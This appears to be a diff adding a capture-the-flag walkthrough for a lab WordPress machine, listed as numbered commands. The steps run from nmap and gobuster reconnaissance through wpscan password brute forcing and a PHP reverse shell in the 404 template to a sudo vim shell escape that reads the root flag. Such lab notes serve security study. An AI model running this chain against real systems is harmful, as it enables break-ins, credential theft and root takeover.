@@ -1,0 +1,12 @@
+1 - nmap -A -p- 10.10.128.215
+2 - gobuster dir -u http://10.10.128.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - wpscan --url http://10.10.128.215 -e u
+4 - wpscan --url http://10.10.128.215 --usernames c0ldd --passwords /usr/share/wordlists/rockyou.txt
+5 - http://10.10.128.215/wp-login.php
+6 - 404 -> PHP REVERSE SHELL
+7 - cat wp-config.php
+8 - ssh -p 4512 c0lddd@10.10.128.215
+9 - sudo -l (vim)
+10 - sudo vim -c ':!/bin/sh'
+11 - whoami
+12 - cat /root/root.txt
